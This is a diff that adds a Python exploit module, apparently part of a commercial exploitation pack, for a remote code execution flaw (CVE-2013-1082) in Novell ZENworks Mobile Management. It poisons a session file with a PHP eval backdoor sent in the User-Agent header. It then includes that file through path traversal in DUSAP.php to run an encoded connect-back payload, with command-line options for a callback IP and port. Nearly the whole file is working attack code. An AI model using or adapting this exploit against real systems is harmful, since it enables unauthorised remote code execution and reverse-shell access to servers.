@@ -1,0 +1,112 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import string
+import random
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "Novell ZENworks Mobile Management DUSAP.php Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution in Novell ZENworks Mobile Management"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Novell"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["VersionsAffected"] = "Novell ZENworks Mobile Management <= 2.7.0"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-13-088/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2013-1082"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1082"
+DOCUMENTATION["Notes"] = ""
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/"]         
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["ZENworks Mobile Management"]
+        self.testfile="index.php"
+
+        return
+
+    def request1(self):
+        session = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(26))        
+        self.log_paths = ['res/languages/../../../../php/temp/sess_'+session]                
+        
+        command=self.get_php_to_mosdef()
+        command=b64encode(command)
+
+        for i in self.log_paths:
+            s = self.gettcpsock()
+            s.connect((self.target.interface, self.port))
+    
+            try:
+                data = "<?php eval(base64_decode($_SERVER['HTTP_D2'])); ?>"
+                s.send("GET %sdownload.php HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0.1) Gecko/20100101 Firefox/8.0.1%s\r\nCookie: PHPSESSID=%s;\r\n\r\n" % (self.basepath, self.target.interface, data, session))                
+                time.sleep(0.1)
+                data = self.UA.addHeader("D2", command)
+                data = self.UA.GET("DUSAP.php?language=%s"%(i))
+
+                if "Permission denied" in data:
+                    self.log("[*] Log files arent readable")
+                    return 0
+            except:
+                pass                        
+
+            self.log("[+] Looking for PHP connectback")        
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"        
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
